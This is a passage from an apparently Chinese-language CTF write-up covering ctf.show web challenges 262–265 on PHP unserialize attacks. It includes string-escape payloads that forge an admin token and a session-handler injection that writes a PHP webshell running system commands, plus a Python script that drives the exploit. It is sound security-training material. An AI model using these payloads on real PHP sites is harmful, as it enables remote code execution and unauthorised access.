&quot;O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;user&quot;;s:8:&quot;password&quot;;s:4:&quot;user&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>但是当我们反序列化一个<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$c = &#x27;O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;user&quot;;s:8:&quot;password&quot;;s:4:&quot;test&quot;;&#125;user&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($c));</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web262.png)可以看到`password`的值从`user`变成了`test`，也就是`user";}`被忽略了回到题目注释里提示`# @message.php`，访问`message.php`看看<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这说如果`if($msg->token=='admin'){echo $flag;}`打印 flag，但是token题目写死是user，要想办法将它忽略掉。正常情况下，如果我们分别给f、m、t传入a时message序列化后长这样：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;a&quot;;s:2:&quot;to&quot;;s:1:&quot;a&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;//token为user</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web262-1.png)那么现在我们构造序列化内容就需要有<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; //共27字符</span><br></pre></td></tr></table></figure>假如我们向to属性传递 `t=";s:5:"token";s:5:"admin";}` 字符串就变为了下面这样，我们要将末尾的`";s:5:"token";s:4:"user";}"`绕过<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;a&quot;;s:2:&quot;to&quot;;s:27:&quot;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web262-2.png)我们对字符串进来了闭合，这样我们就可以控制token属性的值了，但我们也会发现一点，to属性值的长度变为了27。反序列化时，如果为27则会匹配后面27个字符，这样闭合就没有效果。可以发现 token 的值还是 user![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web262-4.png)这时候题目中的替换字符函数可以帮助到我们<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br></pre></td></tr></table></figure>str_replace会将fuck替换为loveU，且替换是在序列化之后进行的，也就是说，实际字符串长度增加了1，但标明的字符串长度任然为原值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 替换前</span><br><span class="line">s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;</span><br><span class="line">// 替换后</span><br><span class="line">s:2:&quot;to&quot;;s:4:&quot;loveU&quot;;</span><br></pre></td></tr></table></figure>通过这种方法，我们就可以凭空增加字符，来成功进行闭合<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br><span class="line">// 后面多出27个字符，所以我们写27个fuck，替换为loveU后，增加了27个字符，来达到字符串逃逸</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>payload执行后的序列化长这样：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;a&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>这样，;s:5:"token";s:4:"user";}"就被忽略掉了。反序列化后可以看到 token 的值变为了 admin![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web262-3.png)所以payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=a&amp;m=a&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>随后访问 message.php 得到flag![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web262-5.png)### web263访问显示web页面![image-20231102170003396](C:\Users\MTRleed\AppData\Roaming\Typora\typora-user-images\image-20231102170003396.png)dirsearch 扫描，发现`www.zip`![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web263-1.png)解压查看代码index.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 16:28:37</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-06 19:21:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//超过5次禁止登陆</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>在 index.php 我们发现$_SESSION['limit']我们可以进行控制flag在flag.php处，目测需要rce<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag=&quot;flag_here&quot;;</span><br></pre></td></tr></table></figure>inc.php 设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br></pre></td></tr></table></figure>并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>> file_put_contents()：将一个字符串写入文件>> **file_put_contents**  (文件名   , 文件内容) 存在文件写入函数，所以写入一句话即可，payload如下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;mtrleed.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php system(&quot;tac flag.php&quot;);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>=<span class="string">&#x27;mtrleed&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>运行后得到<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMToibXRybGVlZC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MzE6Ijw/cGhwIHN5c3RlbSgidGFjIGZsYWcucGhwIik7Pz4iO3M6Njoic3RhdHVzIjtzOjc6Im10cmxlZWQiO30=</span><br></pre></td></tr></table></figure>然后存进cookie中，带着cookie去访问`index.php`，接着访问`inc/inc.php`，然后就会生成文件`log-mtrleed.php`，可以直接写一个脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web263</span></span><br><span class="line"><span class="comment"># time: 2023/11/7 10:09</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://568690f1-fd37-4dc4-b3ae-e6dd156778c6.challenge.ctf.show/&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;8933m39bs8njm7gv17li7p4c87&quot;</span>, <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMToibXRybGVlZC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MzE6Ijw/cGhwIHN5c3RlbSgidGFjIGZsYWcucGhwIik7Pz4iO3M6Njoic3RhdHVzIjtzOjc6Im10cmxlZWQiO30=&quot;</span>&#125;</span><br><span class="line">res1 = requests.get(url + <span class="string">&quot;index.php&quot;</span>, cookies=cookies)</span><br><span class="line"></span><br><span class="line">res2 = requests.get(url + <span class="string">&quot;inc/inc.php&quot;</span>, cookies=cookies)</span><br><span class="line"></span><br><span class="line">res3 = requests.get(url + <span class="string">&quot;log-mtrleed.php&quot;</span>, cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(res3.text)</span><br></pre></td></tr></table></figure>脚本访问![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web263-3.png)手工访问![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web263-2.png)### web264(session反序列化字符串逃逸)index.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>message.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>和web262差不多，可以使用前面的payload打，但是在访问 message.php 时需要`coookie`中的`msg`有值，因为`message.php`有如下判断<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web264.png)web262 的包是这样的![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web264-1.png)### web265<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 